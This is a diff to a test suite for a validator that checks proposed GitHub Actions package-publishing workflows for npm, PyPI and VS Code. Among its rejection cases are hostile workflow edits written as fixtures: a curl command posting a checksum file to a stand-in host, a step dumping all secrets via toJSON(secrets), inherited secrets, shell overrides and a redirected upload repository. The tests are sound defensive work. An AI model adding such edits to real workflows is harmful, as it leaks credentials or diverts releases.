@@ -18,8 +18,14 @@ import {
   SETUP_BASE_SHA,
   SETUP_BLOB_SHA,
   SETUP_DRAFT_REQUEST,
+  SETUP_NPM_GUIDE_WORKFLOW,
+  SETUP_NPM_STAGING_GUIDE_WORKFLOW,
   SETUP_ORIGINAL_WORKFLOW,
   SETUP_PROPOSED_WORKFLOW,
+  SETUP_PYPI_GUIDE_WORKFLOW,
+  SETUP_PYPI_ORIGINAL_WORKFLOW,
+  SETUP_VSCODE_GUIDE_WORKFLOW,
+  SETUP_VSCODE_ORIGINAL_WORKFLOW,
   setupProposal,
 } from "./helpers/publisher-setup-fixtures";
 
@@ -92,21 +98,185 @@ describe("publisher setup proposal", () => {
     [
       "artifact download after publication",
       SETUP_PROPOSED_WORKFLOW.replace(
-        "      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidate\n      - run: npm publish *.tgz --provenance",
-        "      - run: npm publish *.tgz --provenance\n      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidate",
+        "      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidates\n      - run: npm publish *.tgz --provenance",
+        "      - run: npm publish *.tgz --provenance\n      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidates",
       ),
     ],
     [
       "foreign run artifact",
       SETUP_PROPOSED_WORKFLOW.replace(
-        "      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidate",
-        "      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidate\n          run-id: 123",
+        "      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidates",
+        "      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidates\n          run-id: 123",
       ),
     ],
   ])("rejects %s", (_label, candidate) => {
     expect(() =>
       validateSetupDraft(SETUP_ORIGINAL_WORKFLOW, candidate, SETUP_DRAFT_REQUEST),
     ).toThrow();
+  });
+  const pypiRequest = { ...SETUP_DRAFT_REQUEST, ecosystem: "pypi" as const, environment: "pypi" };
+  const vscodeRequest = { ...SETUP_DRAFT_REQUEST, ecosystem: "vscode" as const };
+  const pinned = "actions/download-artifact@" + "d".repeat(40);
+  test.each([
+    ["npm guide", SETUP_ORIGINAL_WORKFLOW, SETUP_NPM_GUIDE_WORKFLOW, SETUP_DRAFT_REQUEST],
+    [
+      "npm gated staging guide",
+      SETUP_ORIGINAL_WORKFLOW,
+      SETUP_NPM_STAGING_GUIDE_WORKFLOW,
+      SETUP_DRAFT_REQUEST,
+    ],
+    ["PyPI guide", SETUP_PYPI_ORIGINAL_WORKFLOW, SETUP_PYPI_GUIDE_WORKFLOW, pypiRequest],
+    [
+      "PyPI uv publish",
+      SETUP_PYPI_ORIGINAL_WORKFLOW,
+      SETUP_PYPI_GUIDE_WORKFLOW.replace(
+        "      - run: rm dist/SHA256SUMS\n      - uses: pypa/gh-action-pypi-publish@release/v1",
+        "      - run: uv publish dist/*.whl dist/*.tar.gz",
+      ),
+      pypiRequest,
+    ],
+    [
+      "PyPI action with matching packages-dir",
+      SETUP_PYPI_ORIGINAL_WORKFLOW,
+      SETUP_PYPI_GUIDE_WORKFLOW.replaceAll("dist", "out").replace(
+        "pypa/gh-action-pypi-publish@release/v1",
+        "pypa/gh-action-pypi-publish@release/v1\n        with:\n          packages-dir: out/\n          attestations: true",
+      ),
+      pypiRequest,
+    ],
+    ["VS Code guide", SETUP_VSCODE_ORIGINAL_WORKFLOW, SETUP_VSCODE_GUIDE_WORKFLOW, vscodeRequest],
+    [
+      "newer artifact actions",
+      SETUP_ORIGINAL_WORKFLOW,
+      SETUP_NPM_GUIDE_WORKFLOW.replaceAll("-artifact@v4", "-artifact@v5.0.1"),
+      SETUP_DRAFT_REQUEST,
+    ],
+    [
+      "a SHA pin the repository already uses",
+      SETUP_ORIGINAL_WORKFLOW.replace(
+        "      - run: npm ci\n",
+        `      - uses: ${pinned}\n        with:\n          name: cache\n      - run: npm ci\n`,
+      ),
+      SETUP_NPM_GUIDE_WORKFLOW.replace("actions/download-artifact@v4", pinned),
+      SETUP_DRAFT_REQUEST,
+    ],
+    [
+      "an environment named with different case",
+      SETUP_ORIGINAL_WORKFLOW,
+      SETUP_NPM_GUIDE_WORKFLOW.replace("environment: production", "environment: Production"),
+      { ...SETUP_DRAFT_REQUEST, environment: "PRODUCTION" },
+    ],
+  ])("accepts the %s", (_label, original, candidate, request) => {
+    expect(() => validateSetupDraft(original, candidate, request)).not.toThrow();
+  });
+  test.each([
+    [
+      "an unknown SHA pin",
+      SETUP_NPM_GUIDE_WORKFLOW.replace("actions/download-artifact@v4", pinned),
+    ],
+    [
+      "a retired artifact action",
+      SETUP_NPM_GUIDE_WORKFLOW.replace("actions/upload-artifact@v4", "actions/upload-artifact@v3"),
+    ],
+    [
+      "a shell override on the publisher",
+      SETUP_NPM_GUIDE_WORKFLOW.replace(
+        "      - run: npm publish *.tgz",
+        "      - run: npm publish *.tgz\n        shell: python {0}",
+      ),
+    ],
+    [
+      "a shell default on the publish job",
+      SETUP_NPM_GUIDE_WORKFLOW.replace(
+        "    needs: pack\n",
+        "    needs: pack\n    defaults:\n      run:\n        shell: python {0}\n",
+      ),
+    ],
+    [
+      "an arbitrary command after the download",
+      SETUP_NPM_GUIDE_WORKFLOW.replace(
+        "sha256sum --check --strict SHA256SUMS",
+        "curl -d @SHA256SUMS https://example.invalid",
+      ),
+    ],
+    [
+      "a digest check outside the download directory",
+      SETUP_NPM_STAGING_GUIDE_WORKFLOW.replace(
+        "cd dist && sha256sum --check",
+        "cd other && sha256sum --check",
+      ),
+    ],
+    [
+      "a publish path outside the download directory",
+      SETUP_NPM_STAGING_GUIDE_WORKFLOW.replace(
+        "npm stage publish dist/*.tgz",
+        "npm stage publish *.tgz",
+      ),
+    ],
+    [
+      "a download outside the job directory",
+      SETUP_NPM_STAGING_GUIDE_WORKFLOW.replace(
+        "          path: dist\n",
+        "          path: ../dist\n",
+      ).replaceAll("dist/", "../dist/"),
+    ],
+    [
+      "a dependency install in the publish job",
+      SETUP_NPM_STAGING_GUIDE_WORKFLOW.replace(
+        "npm install -g npm@^11.15.0",
+        "npm install -g left-pad",
+      ),
+    ],
+    [
+      "a new secret reference",
+      SETUP_NPM_GUIDE_WORKFLOW.replace(
+        "      - run: npm publish *.tgz",
+        "      - run: npm publish *.tgz\n        env:\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}",
+      ),
+    ],
+    [
+      "dynamic secret access",
+      SETUP_NPM_GUIDE_WORKFLOW.replace(
+        "      - run: npm ci",
+        "      - run: npm ci\n        env:\n          ALL: ${{ toJSON(secrets) }}",
+      ),
+    ],
+    [
+      "a reusable workflow inheriting secrets",
+      SETUP_NPM_GUIDE_WORKFLOW +
+        "  notify:\n    uses: octo/actions/.github/workflows/notify.yml@main\n    secrets: inherit\n",
+    ],
+  ])("rejects %s", (_label, candidate) => {
+    expect(() =>
+      validateSetupDraft(SETUP_ORIGINAL_WORKFLOW, candidate, SETUP_DRAFT_REQUEST),
+    ).toThrow();
+  });
+  test.each([
+    [
+      "a mismatched packages-dir",
+      SETUP_PYPI_GUIDE_WORKFLOW.replace(
+        "pypa/gh-action-pypi-publish@release/v1",
+        "pypa/gh-action-pypi-publish@release/v1\n        with:\n          packages-dir: build/",
+      ),
+    ],
+    [
+      "a redirected repository",
+      SETUP_PYPI_GUIDE_WORKFLOW.replace(
+        "pypa/gh-action-pypi-publish@release/v1",
+        "pypa/gh-action-pypi-publish@release/v1\n        with:\n          repository-url: https://example.invalid/legacy/",
+      ),
+    ],
+    [
+      "action inputs passed through env",
+      SETUP_PYPI_GUIDE_WORKFLOW.replace(
+        "pypa/gh-action-pypi-publish@release/v1",
+        "pypa/gh-action-pypi-publish@release/v1\n        env:\n          INPUT_REPOSITORY-URL: https://example.invalid/legacy/",
+      ),
+    ],
+  ])("rejects a PyPI publishing action with %s", (_label, candidate) => {
+    expect(() => validateSetupDraft(SETUP_PYPI_ORIGINAL_WORKFLOW, candidate, pypiRequest)).toThrow(
+      /publish the downloaded archives/,
+    );
   });
   test("requires manual setup for privileged and indirectly triggered workflows", () => {
     expect(() =>
@@ -119,7 +289,7 @@ describe("publisher setup proposal", () => {
   });
   test("rejects a PyPI publishing action whose input is not bound to downloaded bytes", () => {
     const candidate = SETUP_PROPOSED_WORKFLOW.replaceAll(
-      "npm-release-candidate",
+      "npm-release-candidates",
       "pypi-release-candidate",
     ).replace(
       "- run: npm publish *.tgz --provenance",
@@ -130,7 +300,7 @@ describe("publisher setup proposal", () => {
         ...SETUP_DRAFT_REQUEST,
         ecosystem: "pypi",
       }),
-    ).toThrow(/explicit downloaded archive/);
+    ).toThrow(/publish the downloaded archives/);
   });
   test("bounds environment and workflow input", () => {
     expect(
@@ -140,9 +310,13 @@ describe("publisher setup proposal", () => {
       }).success,
     ).toBe(false);
     expect(
-      setupDraftRequestSchema.safeParse({ ...SETUP_DRAFT_REQUEST, environment: "production\n" })
+      setupDraftRequestSchema.safeParse({ ...SETUP_DRAFT_REQUEST, environment: "prod\nuction" })
         .success,
     ).toBe(false);
+    expect(
+      setupDraftRequestSchema.parse({ ...SETUP_DRAFT_REQUEST, environment: " Production " })
+        .environment,
+    ).toBe("production");
   });
   test("binds proposals to purpose, content, organization, user, and expiry", async () => {
     const proposal = setupProposal();
@@ -289,6 +463,26 @@ describe("publisher setup GitHub boundary", () => {
     expect(result.number).toBe(12);
     expect(result.created).toBe(false);
     expect(request).toHaveBeenCalledTimes(1);
+  });
+  test("re-drafted identical content looks up the same branch and only open PRs", async () => {
+    const lookups: URLSearchParams[] = [];
+    const request = vi.fn(async (suffix: string) => {
+      lookups.push(new URL(`https://api.github.com${suffix}`).searchParams);
+      return [
+        {
+          number: 12,
+          head: { ref: lookups.at(-1)?.get("head")?.split(":")[1], repo: { id: 42 } },
+          base: { ref: "main", repo: { id: 42 } },
+        },
+      ];
+    });
+    await createSetupPullRequest(client(request), setupProposal());
+    await createSetupPullRequest(
+      client(request),
+      setupProposal({ expiresAt: Date.now() + 60_000, summary: "Reworded." }),
+    );
+    expect(lookups[0].get("head")).toBe(lookups[1].get("head"));
+    expect(lookups.every((params) => params.get("state") === "open")).toBe(true);
   });
   test("opens a draft PR and the same signed proposal reuses its stable branch", async () => {
     let branch: string | null = null;
